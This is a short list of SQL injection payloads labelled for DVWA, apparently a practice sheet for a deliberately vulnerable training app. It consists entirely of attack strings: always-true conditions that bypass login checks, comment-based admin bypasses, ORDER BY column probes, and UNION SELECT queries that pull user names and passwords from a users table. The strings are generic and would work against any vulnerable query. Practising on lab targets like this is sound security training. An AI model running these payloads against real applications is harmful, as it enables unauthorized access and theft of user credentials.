# SQL Injection Payloads — DVWA

1' OR '1'='1
1' OR 1=1 --
' OR '1'='1' --
1' UNION SELECT user, password FROM users --
' UNION SELECT user, password FROM users --
1' AND 1=1 --
1' AND 1=2 --
' OR 'x'='x
admin' --
' OR 1=1 #
1' ORDER BY 1 --
1' ORDER BY 2 --